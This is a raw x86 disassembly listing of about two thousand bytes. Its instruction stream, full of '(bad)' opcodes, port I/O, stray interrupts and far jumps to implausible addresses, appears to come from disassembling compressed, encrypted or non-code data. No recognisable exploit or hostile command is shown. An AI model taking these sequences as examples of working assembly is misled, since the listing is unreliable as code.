  40d84d:	les    ecx,FWORD PTR [edx-0x41]
  40d850:	push   cs
  40d851:	jmp    0xeafc:0x8c9c64f9
  40d858:	test   DWORD PTR [esi+0x2],edx
  40d85b:	mov    al,ds:0xbf7db646
  40d860:	cmp    al,0xdf
  40d862:	xchg   esi,eax
  40d863:	lock mov ds:0x9e2e6257,al
  40d869:	ins    BYTE PTR es:[edi],dx
  40d86a:	in     eax,0x39
  40d86c:	push   eax
  40d86d:	sub    ecx,DWORD PTR [edi]
  40d86f:	jne    0x40d8e6
  40d871:	ins    DWORD PTR es:[edi],dx
  40d872:	mov    al,0x43
  40d874:	inc    edi
  40d875:	inc    esp
  40d876:	lahf   
  40d877:	inc    edx
  40d878:	cmp    dl,BYTE PTR [ebp-0x26]
  40d87b:	cmc    
  40d87c:	cmp    eax,0x893b3da8
  40d881:	mov    BYTE PTR [esi+0x31e28e0],dh
  40d887:	adc    DWORD PTR [ebx-0x44],ecx
  40d88a:	dec    esi
  40d88b:	push   edi
  40d88c:	data16 jns 0x40d8a4
  40d88f:	jno    0x40d842
  40d891:	pusha  
  40d892:	cwde   
  40d893:	inc    edi
  40d894:	push   ds
  40d895:	mov    bl,BYTE PTR [eax+0x7b18c539]
  40d89b:	add    eax,0xd309e898
  40d8a0:	(bad)  
  40d8a1:	aam    0x54
  40d8a3:	(bad)  [edi+0x6cd4b73b]
  40d8a9:	cmp    dh,BYTE PTR [esi+0x51e78f00]
  40d8af:	adc    ecx,ebx
  40d8b1:	xlat   BYTE PTR ds:[ebx]
  40d8b2:	cmp    BYTE PTR [eax],bl
  40d8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b5:	jbe    0x40d8e5
  40d8b7:	mov    ebp,0x7f7be98c
  40d8bc:	pop    esp
  40d8bd:	mov    dh,0x4c
  40d8bf:	outs   dx,BYTE PTR ds:[esi]
  40d8c0:	cli    
  40d8c1:	arpl   WORD PTR [edx],cx
  40d8c3:	out    dx,al
  40d8c4:	cli    
  40d8c5:	nop
  40d8c6:	dec    eax
  40d8c7:	popa   
  40d8c8:	bswap  esi
  40d8ca:	std    
  40d8cb:	mov    al,ds:0x911301fe
  40d8d0:	mov    DWORD PTR [ebp-0x1d6fdcf9],ecx
  40d8d6:	inc    esi
  40d8d7:	mov    esi,ebx
  40d8d9:	in     al,0xad
  40d8db:	lock mov edx,0x5c865158
  40d8e1:	in     al,0xf8
  40d8e3:	mov    esp,0x79d5a0d7
  40d8e8:	fdivr  st,st(6)
  40d8ea:	push   ds
  40d8eb:	xor    eax,0x4850081
  40d8f0:	mov    eax,ds:0x18f3671f
  40d8f5:	loop   0x40d92c
  40d8f7:	pop    ss
  40d8f8:	xchg   edi,eax
  40d8f9:	jmp    0xd3b5:0x720b43c8
  40d900:	adc    DWORD PTR [edx-0x45b81d2d],ebp
  40d906:	fcom   DWORD PTR [ecx]
  40d908:	sbb    DWORD PTR [edx+0x3b],esi
  40d90b:	cdq    
  40d90c:	jecxz  0x40d980
  40d90e:	pop    ebx
  40d90f:	fimul  WORD PTR [ebx-0x4f]
  40d912:	cwde   
  40d913:	xchg   edi,eax
  40d914:	nop
  40d915:	out    dx,al
  40d916:	push   eax
  40d917:	fidivr DWORD PTR [edx+0xd]
  40d91a:	(bad)  
  40d91b:	neg    eax
  40d91d:	leave  
  40d91e:	cmovle ecx,DWORD PTR [ebx+0x507eb10a]
  40d925:	dec    edi
  40d926:	push   ebx
  40d927:	mov    ecx,0x42049480
  40d92d:	je     0x40d969
  40d92f:	mov    ah,0xd8
  40d931:	jae    0x40d9ac
  40d933:	fsubr  QWORD PTR [ebp-0x1bc7cc26]
  40d939:	jbe    0x40d989
  40d93b:	cmp    ch,BYTE PTR [eax-0x7176f532]
  40d941:	arpl   WORD PTR [esi-0x2d],ax
  40d944:	jbe    0x40d9aa
  40d946:	and    ecx,edi
  40d948:	push   ebx
  40d949:	ins    BYTE PTR es:[edi],dx
  40d94a:	xchg   esi,eax
  40d94b:	fisttp DWORD PTR [esi-0x542d612]
  40d951:	inc    ebx
  40d952:	xor    ebp,DWORD PTR [edx+edi*1]
  40d955:	leave  
  40d956:	frstpm(287 only) 
  40d958:	daa    
  40d959:	or     al,0x4a
  40d95b:	(bad)  
  40d95c:	and    al,BYTE PTR [ebx-0x70]
  40d95f:	and    eax,0x93838387
  40d964:	inc    ecx
  40d965:	cmp    DWORD PTR [eax+0x3c],ecx
  40d968:	dec    ebp
  40d969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d96a:	mov    dh,0xc9
  40d96c:	cmp    ebp,esi
  40d96e:	icebp  
  40d96f:	add    edx,DWORD PTR [esi+0x210a544d]
  40d975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d976:	js     0x40d9e2
  40d978:	aam    0x9d
  40d97a:	mov    edx,0x6a41e207
  40d97f:	adc    edx,DWORD PTR [esi-0x33e40a7]
  40d985:	sbb    edx,DWORD PTR [edx-0x13d91001]
  40d98b:	leave  
  40d98c:	loope  0x40d951
  40d98e:	rol    DWORD PTR [eax-0x1e56734f],0x32
  40d995:	cwde   
  40d996:	cmp    BYTE PTR [eiz*1+0x30ff23c7],bl
  40d99d:	into   
  40d99e:	les    edx,FWORD PTR [ecx-0xb]
  40d9a1:	ret    
  40d9a2:	jo     0x40d974
  40d9a4:	fnstenv [edi-0x3eb8cf38]
  40d9aa:	pop    edi
  40d9ab:	ja     0x40d953
  40d9ad:	sbb    al,0x8a
  40d9af:	add    BYTE PTR [esi-0x42],ah
  40d9b2:	push   cs
  40d9b3:	stos   DWORD PTR es:[edi],eax
  40d9b4:	fisttp DWORD PTR [esi]
  40d9b6:	popf   
  40d9b7:	add    eax,0xdf7f5af2
  40d9bc:	xchg   BYTE PTR [ecx],dh
  40d9be:	mov    ebp,0x5e68ade0
  40d9c3:	pop    ebp
  40d9c4:	adc    al,0x27
  40d9c6:	push   cs
  40d9c7:	xchg   cl,cl
  40d9c9:	jnp    0x40d97e
  40d9cb:	or     DWORD PTR [edx+ebp*4-0x23],edx
  40d9cf:	mov    cl,0xdb
  40d9d1:	xor    BYTE PTR [ebx+0x517d0c9b],al
  40d9d7:	les    esi,FWORD PTR [esi+eiz*2+0x6450e8d3]
  40d9de:	or     edi,eax
  40d9e0:	gs mov bh,dh
  40d9e3:	xchg   esi,eax
  40d9e4:	mov    ebx,esi
  40d9e6:	add    ebp,DWORD PTR [ecx+0x35]
  40d9e9:	add    bl,BYTE PTR [edi-0x6c]
  40d9ec:	gs sbb ebx,edx
  40d9ef:	dec    ecx
  40d9f0:	out    dx,eax
  40d9f1:	mov    al,0xa6
  40d9f3:	xlat   BYTE PTR ds:[ebx]
  40d9f4:	aam    0xc
  40d9f6:	aaa    
  40d9f7:	lods   al,BYTE PTR ds:[esi]
  40d9f8:	mov    dl,BYTE PTR [esi]
  40d9fa:	mov    ch,0x70
  40d9fc:	pop    edi
  40d9fd:	inc    edi
  40d9fe:	pop    ebp
  40d9ff:	adc    DWORD PTR [ebp-0x1ae67b99],edi
  40da05:	pop    ebx
  40da06:	repz jmp 0x40d9e8
  40da09:	inc    edx
  40da0a:	jne    0x40d999
  40da0c:	ins    BYTE PTR es:[edi],dx
  40da0d:	and    dh,BYTE PTR [ecx]
  40da0f:	adc    edi,DWORD PTR [esi-0x70]
  40da12:	ror    DWORD PTR [ebx-0x61],cl
  40da15:	inc    edx
  40da16:	jl     0x40da2e
  40da18:	test   BYTE PTR [esi+edx*1],0x16
  40da1c:	ins    BYTE PTR es:[edi],dx
  40da1d:	push   ecx
  40da1e:	je     0x40d9e5
  40da20:	popf   
  40da21:	push   esi
  40da22:	stos   BYTE PTR es:[edi],al
  40da23:	test   al,0x3a
  40da25:	sahf   
  40da26:	inc    esi
  40da27:	sbb    al,0x76
  40da29:	mov    al,ds:0x6413b7d
  40da2e:	mov    BYTE PTR [edx-0x2d],bh
  40da31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da33:	popa   
  40da34:	or     eax,0x195180b3
  40da39:	retf   0x53b0
  40da3c:	imul   eax,DWORD PTR [ebx],0xfffffffa
  40da3f:	retf   0x8c06
  40da42:	rcl    edi,1
  40da44:	mov    bh,bh
  40da46:	push   0xffffff9f
  40da48:	xor    BYTE PTR [edi-0x9c0c597],dl
  40da4e:	mov    DWORD PTR [ebx+0x64],edi
  40da51:	add    BYTE PTR [edi+0x67],ah
  40da54:	mov    esp,0x845172a4
  40da59:	inc    BYTE PTR [ecx+ebx*2-0x3c]
  40da5d:	sar    ah,1
  40da5f:	lods   eax,DWORD PTR ds:[esi]
  40da60:	mov    ebp,0x99c6df1b
  40da65:	ds gs jns 0x40d9ec
  40da69:	sbb    DWORD PTR [edx+0x1c],eax
  40da6c:	test   BYTE PTR [edx],bh
  40da6e:	frstor fs:[eax]
  40da71:	call   0x5efa1fc0
  40da76:	rol    DWORD PTR [ebx],0x1e
  40da79:	in     al,dx
  40da7a:	cmp    ch,BYTE PTR [ebp-0x7f185d22]
  40da80:	imul   esp,DWORD PTR [edi],0x62b14fcc
  40da86:	nop
  40da87:	add    al,bl
  40da89:	push   es
  40da8a:	iret   
  40da8b:	or     DWORD PTR [eax],ebp
  40da8d:	arpl   WORD PTR [edx-0x78e0a7c1],bx
  40da93:	fisttp QWORD PTR [esi*8-0x43758248]
  40da9a:	jae    0x40da3a
  40da9c:	aaa    
  40da9d:	out    0xff,eax
  40da9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa0:	pop    eax
  40daa1:	imul   esi,DWORD PTR ds:0xce6f530b,0xb4bf64e8
  40daab:	push   eax
  40daac:	int    0xf9
  40daae:	xchg   esi,eax
  40daaf:	out    dx,al
  40dab0:	xor    eax,0x78e6fa5a
  40dab5:	jne    0x40da9e
  40dab7:	(bad)  
  40dab8:	ja     0x40daab
  40daba:	cld    
  40dabb:	add    al,0x6a
  40dabd:	ffree  st(7)
  40dabf:	add    edx,DWORD PTR [edx+ebp*2-0x720be002]
  40dac6:	repnz adc BYTE PTR [edx],dh
  40dac9:	shl    ebp,cl
  40dacb:	data16 scas al,BYTE PTR es:[edi]
  40dacd:	fwait
  40dace:	into   
  40dacf:	xchg   BYTE PTR [eax+ecx*4-0x2b],bh
  40dad3:	sbb    ecx,ebx
  40dad5:	xchg   DWORD PTR [esi-0x3e],ecx
  40dad8:	je     0x40db17
  40dada:	icebp  
  40dadb:	xchg   DWORD PTR [ebp-0x3d],ecx
  40dade:	fs inc esp
  40dae0:	adc    cl,dh
  40dae2:	cli    
  40dae3:	inc    ebx
  40dae4:	jne    0x40da8b
  40dae6:	fcomp  QWORD PTR ds:0xf2c4ff98
  40daec:	xor    ah,bh
  40daee:	in     eax,dx
  40daef:	bound  edx,QWORD PTR [esi+esi*8+0x27b6d38f]
  40daf6:	push   0xffffffaf
  40daf8:	add    al,0x5b
  40dafa:	jb     0x40daef
  40dafc:	dec    ebp
  40dafd:	inc    esp
  40dafe:	mov    ds:0x56d49568,al
  40db03:	ficomp WORD PTR [edx-0x4]
  40db06:	ins    BYTE PTR es:[edi],dx
  40db07:	cmp    esp,esi
  40db09:	int    0xee
  40db0b:	inc    ebx
  40db0c:	fistp  DWORD PTR [esi-0x2b]
  40db0f:	ins    DWORD PTR es:[edi],dx
  40db10:	ret    0x89de
  40db13:	(bad)  
  40db14:	mov    al,0x6a
  40db16:	lods   eax,DWORD PTR ds:[esi]
  40db17:	mov    dh,0x10
  40db19:	mov    dl,0x37
  40db1b:	cmp    eax,0xbfb6b0fb
  40db20:	popa   
  40db21:	mov    ecx,0x5d12414f
  40db26:	mov    eax,0x1ea52e39
  40db2b:	retf   
  40db2c:	jno    0x40db10
  40db2e:	std    
  40db2f:	xor    edi,DWORD PTR [eax-0x29487820]
  40db35:	push   edi
  40db36:	inc    ecx
  40db37:	mov    edx,edx
  40db39:	ja     0x40dbb5
  40db3b:	(bad)  
  40db3c:	out    0xbf,eax
  40db3e:	xor    cl,BYTE PTR [esi+0x5e816a25]
  40db44:	and    BYTE PTR [edi],al
  40db46:	retf   0x6c77
  40db49:	int    0xd7
  40db4b:	ret    0xb30c
  40db4e:	or     BYTE PTR [ebp-0x3e],bh
  40db51:	scas   al,BYTE PTR es:[di]
  40db53:	aas    
  40db54:	clc    
  40db55:	xchg   esi,eax
  40db56:	push   ebp
  40db57:	adc    ch,BYTE PTR [eax+edi*4]
  40db5a:	xchg   edx,eax
  40db5b:	xor    ch,BYTE PTR [esi+0x673a091b]
  40db61:	mov    WORD PTR [edi],ds
  40db63:	add    BYTE PTR [eax-0x29776513],0x1b
  40db6a:	sub    BYTE PTR [eax-0x10309c0a],cl
  40db70:	sub    al,0x3c
  40db72:	dec    esp
  40db73:	or     al,0x11
  40db75:	adc    eax,0x9b9c5a43
  40db7a:	addr16 cmp al,0xd8
  40db7d:	(bad)  
  40db7e:	test   eax,0xa15037bc
  40db83:	or     al,0x1f
  40db85:	mov    bh,0x6e
  40db87:	test   al,0xd8
  40db89:	ss ins DWORD PTR es:[edi],dx
  40db8b:	loopne 0x40db65
  40db8d:	sub    BYTE PTR [eax+0x8],ch
  40db90:	(bad)  
  40db92:	xor    al,0x6a
  40db94:	inc    edx
  40db95:	mov    eax,ds:0x7623a6ba
  40db9a:	pushf  
  40db9b:	push   ebx
  40db9c:	and    BYTE PTR [edx],bl
  40db9e:	mov    ebp,DWORD PTR [ebx+0x6d2594d]
  40dba4:	mov    esi,0xb1af13d7
  40dba9:	loope  0x40db68
  40dbab:	mov    al,ds:0x8e3d54e5
  40dbb0:	pop    edx
  40dbb1:	mov    ah,0x1a
  40dbb3:	sti    
  40dbb4:	add    eax,0xa784dc6f
  40dbb9:	sbb    al,0x9
  40dbbb:	add    BYTE PTR [ebp+0x22],ch
  40dbbe:	ins    BYTE PTR es:[edi],dx
  40dbbf:	add    esi,DWORD PTR [edx+eiz*1]
  40dbc2:	mov    al,0x1f
  40dbc4:	pop    ecx
  40dbc5:	hlt    
  40dbc6:	adc    al,0xe1
  40dbc8:	jnp    0x40dc02
  40dbca:	add    BYTE PTR [edi-0x76],bh
  40dbcd:	bound  ebp,QWORD PTR [ecx]
  40dbcf:	xor    al,BYTE PTR [eax-0x5f]
  40dbd2:	mov    DWORD PTR [esi+0xde33c26],edi
  40dbd8:	or     dh,dl
  40dbda:	bound  edx,QWORD PTR [edx+0x64ca0013]
  40dbe0:	imul   edi,ecx,0x452c00d9
  40dbe6:	stc    
  40dbe7:	(bad)
  40dbea:	jmp    0x6deb:0xb29332c7
  40dbf1:	mov    BYTE PTR [ebp-0x5d],dh
  40dbf4:	dec    ecx
  40dbf5:	mov    eax,0x42eb489f
  40dbfa:	pop    ecx
  40dbfb:	xor    eax,0xeabb74ba
  40dc00:	ins    BYTE PTR es:[edi],dx
  40dc01:	mov    al,ds:0x449798a3
  40dc06:	(bad)  
  40dc07:	rcr    DWORD PTR [ebp-0x3a],cl
  40dc0a:	or     BYTE PTR [edx+0x4cb4f88b],0xf4
  40dc11:	mov    cl,0x65
  40dc13:	outs   dx,BYTE PTR ds:[esi]
  40dc14:	pusha  
  40dc15:	and    ah,BYTE PTR [eiz*1+0x563025c4]
  40dc1c:	push   ds
  40dc1d:	loope  0x40dc6d
  40dc1f:	sbb    ebx,DWORD PTR [eax-0x40]
  40dc22:	adc    DWORD PTR [esi],0x3c
  40dc25:	(bad)  
  40dc26:	lock push cs
  40dc28:	in     al,0x6
  40dc2a:	(bad)  
  40dc2b:	iret   
  40dc2c:	xor    DWORD PTR [eax],edx
  40dc2e:	or     al,0x1
  40dc30:	icebp  
  40dc31:	outs   dx,DWORD PTR ds:[esi]
  40dc32:	pusha  
  40dc33:	mov    edi,0x2321d5dd
  40dc38:	retf   0x32f6
  40dc3b:	daa    
  40dc3c:	sub    dl,BYTE PTR [ebx]
  40dc3e:	cmp    al,0xad
  40dc40:	push   ss
  40dc41:	test   BYTE PTR [esi+0x37],ah
  40dc44:	ret    
  40dc45:	or     DWORD PTR [edx-0x51],0xe912115b
  40dc4c:	sbb    al,BYTE PTR [ebx]
  40dc4e:	adc    al,0xf7
  40dc50:	dec    ecx
  40dc51:	outs   dx,BYTE PTR ds:[esi]
  40dc52:	daa    
  40dc53:	stos   DWORD PTR es:[edi],eax
  40dc54:	test   BYTE PTR [edx],ch
  40dc56:	push   esp
  40dc57:	imul   esp,edx,0x549d0a24
  40dc5d:	out    dx,eax
  40dc5e:	mov    bl,0x8b
  40dc60:	test   al,0xe0
  40dc62:	rol    bh,cl
  40dc64:	xchg   ebp,eax
  40dc65:	push   eax
  40dc66:	push   ss
  40dc67:	and    BYTE PTR [edi+0x3a],ch
  40dc6a:	xchg   esp,eax
  40dc6b:	add    esp,DWORD PTR [ebx-0x38]
  40dc6e:	pop    edx
  40dc6f:	adc    ebx,edx
  40dc71:	mov    bl,0xb9
  40dc73:	dec    ebx
  40dc74:	and    cl,0xc2
  40dc77:	sub    ebp,ebp
  40dc79:	inc    edx
  40dc7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc7b:	mov    edx,0x8bbc30b5
  40dc80:	(bad)  
  40dc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc82:	nop
  40dc83:	add    DWORD PTR [edx],ebp
  40dc85:	xchg   edx,eax
  40dc86:	(bad)  
  40dc87:	push   ds
  40dc88:	or     DWORD PTR [esi],ecx
  40dc8a:	cmp    ecx,DWORD PTR [eax-0x7d5d68c1]
  40dc90:	fs xchg edx,eax
  40dc92:	enter  0xf381,0x47
  40dc96:	in     eax,dx
  40dc97:	data16 jmp 0x40dc81
  40dc9a:	xor    DWORD PTR [edi+0x6d0101e],ebp
  40dca0:	or     esi,ebx
  40dca2:	xchg   ebx,eax
  40dca3:	xchg   ebp,eax
  40dca4:	outs   dx,BYTE PTR ds:[esi]
  40dca5:	sub    al,0xac
  40dca7:	ja     0x40dc3d
  40dca9:	mov    edx,0xd1fbb399
  40dcae:	test   BYTE PTR [ecx],bh
  40dcb0:	inc    ebp
  40dcb1:	ins    BYTE PTR es:[edi],dx
  40dcb2:	test   BYTE PTR [esp+esi*8],cl
  40dcb5:	mov    ebx,0x7c9455e
  40dcba:	xchg   ecx,eax
  40dcbb:	in     eax,dx
  40dcbc:	sti    
  40dcbd:	jge    0x40dd32
  40dcbf:	push   ebp
  40dcc0:	pop    edi
  40dcc1:	loopne 0x40dd32
  40dcc3:	inc    ebx
  40dcc4:	stos   DWORD PTR es:[edi],eax
  40dcc5:	lahf   
  40dcc6:	and    DWORD PTR [edi+0x14585acb],edx
  40dccc:	test   BYTE PTR [edi-0x6d],0x14
  40dcd0:	pop    ecx
  40dcd1:	pusha  
  40dcd2:	sub    BYTE PTR [edx+0x675d1c71],bl
  40dcd8:	adc    DWORD PTR [eax+0x5],esi
  40dcdb:	or     DWORD PTR [ebp+0x76fdab67],edx
  40dce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce2:	out    0xe2,eax
  40dce4:	mov    bh,0x7f
  40dce6:	jp     0x40dd0b
  40dce8:	push   ebx
  40dce9:	jmp    0x9382786b
  40dcee:	cld    
  40dcef:	int3   
  40dcf0:	dec    edx
  40dcf1:	call   0xd3e35fe3
  40dcf6:	jmp    0x79082218
  40dcfb:	ret    
  40dcfc:	xchg   esp,eax
  40dcfd:	clc    
  40dcfe:	sbb    eax,DWORD PTR [edi-0x1f]
  40dd01:	mov    dl,0x96
  40dd03:	call   0x1b54:0x80f689af
  40dd0a:	ficomp DWORD PTR [eax]
  40dd0c:	push   0x10
  40dd0e:	lock mov edi,0x4d1df951
  40dd14:	jecxz  0x40dcd8
  40dd16:	sbb    DWORD PTR [edi],ebp
  40dd18:	addr16 int3 
  40dd1a:	aad    0x9c
  40dd1c:	dec    ebx
  40dd1d:	int3   
  40dd1e:	ins    DWORD PTR es:[edi],dx
  40dd1f:	push   esp
  40dd20:	and    eax,0xec3691fd
  40dd25:	aas    
  40dd26:	jge    0x40dd5b
  40dd28:	fstp   st(5)
  40dd2a:	lds    edx,FWORD PTR [edi+edi*2-0x30]
  40dd2e:	hlt    
  40dd2f:	nop    eax
  40dd32:	es jo  0x40dcc4
  40dd35:	and    al,0xe5
  40dd37:	daa    
  40dd38:	rol    BYTE PTR [esi-0x20],cl
  40dd3b:	sub    ah,bl
  40dd3d:	in     al,dx
  40dd3e:	out    0xbd,eax
  40dd40:	pop    eax
  40dd41:	mov    cl,0xc4
  40dd43:	lahf   
  40dd44:	cmp    BYTE PTR [edi-0x697c711],bh
  40dd4a:	test   BYTE PTR [ebp+0x366af45f],0x1c
  40dd51:	pop    edx
  40dd52:	ins    DWORD PTR es:[edi],dx
  40dd53:	mov    eax,0xdad31185
  40dd58:	call   0xf1a96bdf
  40dd5d:	adc    eax,0xf76e5fc3
  40dd62:	clc    
  40dd63:	ss loopne 0x40dd4b
  40dd66:	pop    edx
  40dd67:	jnp    0x40dd8a
  40dd69:	mov    dl,0x47
  40dd6b:	jge    0x40dcf6
  40dd6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd6e:	std    
  40dd6f:	or     al,0xc7
  40dd71:	jo     0x40ddbf
  40dd73:	mov    al,0x6c
  40dd75:	(bad)  
  40dd76:	mov    esp,DWORD PTR [ebx]
  40dd78:	in     al,0xc9
  40dd7a:	sbb    eax,0xf62b5576
  40dd7f:	out    0x53,al
  40dd81:	jecxz  0x40dd32
  40dd83:	shr    al,0x6c
  40dd86:	pop    ebp
  40dd87:	lods   al,BYTE PTR ds:[esi]
  40dd88:	inc    ecx
  40dd89:	mov    ebp,0xdb564ca
  40dd8e:	cdq    
  40dd8f:	pop    es
  40dd90:	mov    ah,0xbb
  40dd92:	mov    al,ds:0x266b1392
  40dd97:	mov    esi,0x8133c5c7
  40dd9c:	xchg   edi,eax
  40dd9d:	cli    
  40dd9e:	add    DWORD PTR [ecx],esp
  40dda0:	cmp    dl,BYTE PTR [eax+0x71]
  40dda3:	add    eax,DWORD PTR [edi+ebx*1+0x6c53369a]
  40ddaa:	xchg   edx,eax
  40ddab:	rol    DWORD PTR [esi+eax*8+0x513af8f9],cl
  40ddb2:	and    DWORD PTR [esi],esp
  40ddb4:	rol    edx,cl
  40ddb6:	mov    al,ds:0x7084ad6b
  40ddbb:	xchg   ebp,eax
  40ddbc:	add    al,0xc5
  40ddbe:	mov    WORD PTR [edi-0x6eee582a],gs
  40ddc4:	inc    esi
  40ddc5:	cmc    
  40ddc6:	mov    ebp,0x5397d7cd
  40ddcb:	iret   
  40ddcc:	mov    dh,0x84
  40ddce:	inc    BYTE PTR [esi-0x3a]
  40ddd1:	cmp    al,0xdb
  40ddd3:	addr16 mov bh,0x95
  40ddd6:	sub    BYTE PTR [esi],cl
  40ddd8:	jle    0x40dd90
  40ddda:	call   0x45b39286
  40dddf:	inc    eax
  40dde0:	jle    0x40de61
  40dde2:	dec    ebp
  40dde3:	and    eax,0xd0788cd
  40dde8:	int    0xd5
  40ddea:	ins    DWORD PTR es:[edi],dx
  40ddeb:	and    dl,ah
  40dded:	sub    eax,0x3ff30dcf
  40ddf2:	xchg   BYTE PTR [edx+edx*2],dl
  40ddf5:	lea    esp,[ebp+ebp*4-0x38]
  40ddf9:	inc    esi
  40ddfa:	imul   esi,DWORD PTR [ecx],0xd2f5a020
  40de00:	sub    eax,0x6885b1fb
  40de05:	loop   0x40de00
  40de07:	mov    ds:0xaf666fea,al
  40de0c:	(bad)  
  40de0d:	and    DWORD PTR [ecx-0x2c],edx
  40de10:	add    eax,DWORD PTR [ecx+ecx*8]
  40de13:	adc    eax,0x19de5351
  40de18:	lock ins BYTE PTR es:[edi],dx
  40de1a:	sbb    ecx,edx
  40de1c:	cli    
  40de1d:	jbe    0x40de45
  40de1f:	dec    esp
  40de20:	cld    
  40de21:	leave  
  40de22:	je     0x40de65
  40de24:	bound  ebp,QWORD PTR ds:0x95d84724
  40de2a:	pop    edx
  40de2b:	loopne 0x40de90
  40de2d:	out    0x50,al
  40de2f:	hlt    
  40de30:	sbb    DWORD PTR [eax+esi*4-0x71dac694],esi
  40de37:	pcmpgtw mm4,mm1
  40de3a:	jmp    0xaf990f0
  40de3f:	cmc    
  40de40:	mov    dl,0xcc
  40de42:	lahf   
  40de43:	aaa    
  40de44:	push   eax
  40de45:	jmp    0x40ddd9
  40de47:	xor    esi,DWORD PTR [ebx-0x4b4f964a]
  40de4d:	sub    dh,al
  40de4f:	or     ch,cl
  40de51:	add    ch,BYTE PTR [ecx-0x4e0eec13]
  40de57:	push   edx
  40de58:	and    al,0xff
  40de5a:	jmp    0x43dfb970
  40de5f:	mov    eax,0x5d3b0bd7
  40de64:	cdq    
  40de65:	mov    eax,ds:0x493da2b4
  40de6a:	or     DWORD PTR [ebx+0x1f7cd5be],0xe261a872
  40de74:	sub    edi,DWORD PTR [ecx+0x72]
  40de77:	sbb    BYTE PTR [eax],0xb4
  40de7a:	cwde   
  40de7b:	shr    DWORD PTR [edi+edx*4+0x5f72d2ab],0x14
  40de83:	ins    BYTE PTR es:[edi],dx
  40de84:	and    DWORD PTR [esi+0x6],0xed3e7ce8
  40de8b:	mov    BYTE PTR [ecx],bh
  40de8d:	shr    DWORD PTR [eax-0x74],0x45
  40de91:	icebp  
  40de92:	and    eax,0xc3871ea6
  40de97:	mov    ecx,0x693f1396
  40de9c:	cmp    BYTE PTR [esi+eax*4+0x89107bc],bh
  40dea3:	inc    ecx
  40dea4:	ret    
  40dea5:	jnp    0x40dece
  40dea7:	addr16 cld 
  40dea9:	fist   DWORD PTR [edx+0x2e]
  40deac:	xor    eax,0xd6dcf362
  40deb1:	ror    BYTE PTR [ecx],0x32
  40deb4:	lahf   
  40deb5:	out    0x15,al
  40deb7:	mov    BYTE PTR [edi+0x76a4a1fa],bl
  40debd:	or     eax,0xd9619525
  40dec2:	push   ss
  40dec3:	mov    ecx,0x45f9e815
  40dec8:	dec    edi
  40dec9:	ja     0x40deb3
  40decb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40decc:	loopne 0x40debf
  40dece:	xchg   ebp,eax
  40decf:	outs   dx,DWORD PTR ds:[esi]
  40ded0:	cld    
  40ded1:	cs ret 0xa13a
  40ded5:	push   es
  40ded6:	in     al,dx
  40ded7:	scas   eax,DWORD PTR es:[edi]
  40ded8:	in     eax,dx
  40ded9:	and    BYTE PTR [edx-0x5779dc73],bh
  40dedf:	sbb    DWORD PTR [eax],ecx
  40dee1:	push   ds
  40dee2:	popf   
  40dee3:	and    DWORD PTR [edi-0x6712068a],ecx
  40dee9:	jp     0x40de74
  40deeb:	pop    ds
  40deec:	pop    ss
  40deed:	lea    eax,[eax]
  40deef:	and    ecx,ebx
  40def1:	in     al,0xc1
  40def3:	aas    
  40def4:	es xor eax,0x1d83bd7d
  40defa:	sub    DWORD PTR [esi-0x59271dac],edi
  40df00:	sbb    eax,0x34a0d19b
  40df05:	mov    esi,0xd0e9463a
  40df0a:	and    eax,0xa53b0695
  40df0f:	ror    BYTE PTR [eax-0x637cd4b2],0x2e
  40df16:	aas    
  40df17:	xor    DWORD PTR [eax],ebp
  40df19:	pop    ebp
  40df1a:	sub    ebp,DWORD PTR [edi+0x7e]
  40df1d:	mov    ebp,0xc4fdc038
  40df22:	leave  
  40df23:	lea    edi,[edx+0x28]
  40df26:	retf   
  40df27:	pop    esp
  40df28:	adc    ebp,DWORD PTR [esi-0x480d2997]
  40df2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df2f:	push   0x3db3c91f
  40df34:	add    eax,DWORD PTR [eax]
  40df36:	add    DWORD PTR [ecx+0x10],edx
  40df39:	and    eax,0x9ddd88de
  40df3e:	aas    
  40df3f:	xchg   BYTE PTR [edi+0x13f6e875],al
  40df45:	arpl   WORD PTR [edi+eiz*1-0x4fcfcfa3],cx
  40df4c:	add    DWORD PTR es:[ecx],ebx
  40df4f:	push   eax
  40df50:	fiadd  DWORD PTR [edx+0x1765ebde]
  40df56:	in     al,0x7
  40df58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df59:	ins    BYTE PTR es:[edi],dx
  40df5a:	pop    esi
  40df5b:	ret    0xd8c3
  40df5e:	mov    bl,0x66
  40df60:	ret    
  40df61:	or     dl,bh
  40df63:	push   ss
  40df64:	fbstp  TBYTE PTR [ebp+0x3c60400c]
  40df6a:	data16 fmulp st(0),st
  40df6d:	mov    ss,WORD PTR [bx+di+0x2e]
  40df71:	mov    WORD PTR [edx+0x2042a91],?
  40df77:	xchg   esp,eax
  40df78:	scas   al,BYTE PTR es:[edi]
  40df79:	mov    ch,0xe0
  40df7b:	mov    ebx,0xdf26fbfc
  40df80:	out    0x92,al
  40df82:	rcr    DWORD PTR [edx+0x441beb7c],0xba
  40df89:	leave  
  40df8a:	cmc    
  40df8b:	push   edi
  40df8c:	imul   ebx,DWORD PTR [edx],0xd6dacb33
  40df92:	repnz xor al,dh
  40df95:	test   eax,0xbb840f0b
  40df9a:	and    cl,BYTE PTR [ebx-0x384f22a6]
  40dfa0:	sub    edi,0xa
  40dfa3:	sub    al,0xf8
  40dfa5:	fdiv   QWORD PTR [esi-0xb]
  40dfa8:	adc    DWORD PTR [edx+0x57d05594],0x2e
  40dfaf:	xor    DWORD PTR [ebp-0x34],eax
  40dfb2:	loopne 0x40df4f
  40dfb4:	or     bl,BYTE PTR [ecx-0x3d]
  40dfb7:	push   edi
  40dfb8:	(bad)  
  40dfb9:	jmp    0x40df89
  40dfbb:	lock and ebp,edi
  40dfbe:	lods   al,BYTE PTR cs:[esi]
  40dfc0:	and    DWORD PTR [esi+0x15f81886],esp
